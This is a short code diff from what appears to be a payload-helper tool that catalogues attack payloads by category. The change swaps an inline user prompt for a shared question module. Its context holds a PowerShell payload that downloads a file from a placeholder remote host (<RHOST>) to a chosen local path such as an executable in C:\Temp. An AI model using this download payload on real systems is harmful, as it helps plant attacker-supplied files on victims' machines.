@@ -1,6 +1,6 @@
 var prompt = require('prompt');
-var M = require('mstring')
-
+var M = require('mstring');
+var question = require('../modules/questionUser');
 
 // Initialize array and Payload Helper
 
@@ -140,11 +140,7 @@ Load({
 	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
 	category: "Powershell",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		prompt.message = "Local path to save file? (eg C:\\Temp\\foo.exe) :"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(result._)
-		})	
-
+		question.ask("Local path to save file?", ":", returnToPrepare)	
 	}
 })
 
